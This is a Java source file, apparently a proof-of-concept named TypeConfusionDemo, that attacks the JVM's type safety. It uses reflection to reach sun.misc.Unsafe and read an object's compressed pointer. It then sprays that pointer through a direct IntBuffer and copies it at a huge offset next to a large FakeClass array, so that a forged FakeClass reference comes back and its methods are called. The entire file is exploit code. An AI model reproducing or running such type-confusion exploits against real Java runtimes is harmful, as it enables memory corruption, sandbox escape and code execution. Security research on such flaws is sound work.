package TypeConfusionDemo;

import FakeClassPackage.FakeClass;
import org.openjdk.jol.vm.VM;

import java.nio.ByteBuffer;
import java.nio.IntBuffer;
import java.lang.reflect.Field;
import sun.misc.Unsafe;

public class TypeConfusionDemo {
  public static int emptyLen = 125000000;
  public static int targetLen = 1209098507;
  public static int offset = 999999999;
  public static int length = 2;
  public static int idx = 119999944;
  private static Unsafe unsafe;

  public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException {
    RealClass realClass = RealClass.get();
    int realClassPointer = get_compressed_oop(realClass);
    FakeClass fakeClass = TypeConfusionDemo.use_type_confusion_to_convert_to_fakeclass(realClassPointer);
    FakeClass.doWork();
    FakeClass.beans();
  }

  public static void print_addresses(RealClass realClass, int realClassPointer) {
    System.out.println("Address of realClass: " + VM.current().addressOf(realClass));
    System.out.println("realClassPointer: " + Integer.toHexString(realClassPointer) + " (" + realClassPointer + ")");

  }

  public static int get_compressed_oop(RealClass realClass)
      throws IllegalAccessException, NoSuchFieldException {
    Field field = Unsafe.class.getDeclaredField("theUnsafe");
    field.setAccessible(true);
    unsafe = (Unsafe)field.get(null);
    RealClass[] helperArray = new RealClass[1];
    helperArray[0] = realClass;
    long baseOffset = unsafe.arrayBaseOffset(RealClass[].class);
    int addressSize = unsafe.addressSize();
    return (int) unsafe.getLong(helperArray, baseOffset);
  }

  public static FakeClass use_type_confusion_to_convert_to_fakeclass(int objPointer) {
    int bytes = 400;
    ByteBuffer bb = ByteBuffer.allocateDirect(bytes);
    IntBuffer ib = bb.asIntBuffer();
    for (int i = 0; i < ib.limit(); i++) {
      ib.put(i, 0xBBBBBBBB);
    }
    for (int i = 0; i < ib.limit(); i++) {
      ib.put(i, objPointer);
    }

    FakeClass[] fakeClassArray = TypeConfusionDemo.write_realclass_from_IB_to_fakeclass(ib);

//    System.out.println("IB[0] memory address = " + VM.current().addressOf(ib.get(0)));
//    System.out.println("fakeClass[idx] memory address = " + VM.current().addressOf(fakeClass));

    return fakeClassArray[idx];
  }

  public static FakeClass[] write_realclass_from_IB_to_fakeclass(IntBuffer ib) {
    //Make arrays
    FakeClass[] fakeClassArray = new FakeClass[emptyLen];
    int[] dst = new int[targetLen];

    // fill target arrays
    for (int i = 0; i < dst.length; i++) {
      dst[i] = 0xA2A2A2A2;
    }

//    System.out.println("newClassLoader memory address = " + VM.current().addressOf(fakeClassArray));
//    System.out.println("DST memory address = " + VM.current().addressOf(dst));

    ib.get(dst, offset, length);

//    System.out.println("fakeClassArray[0] memory address = " + VM.current().addressOf(fakeClassArray[0]));
    return fakeClassArray;
  }
}
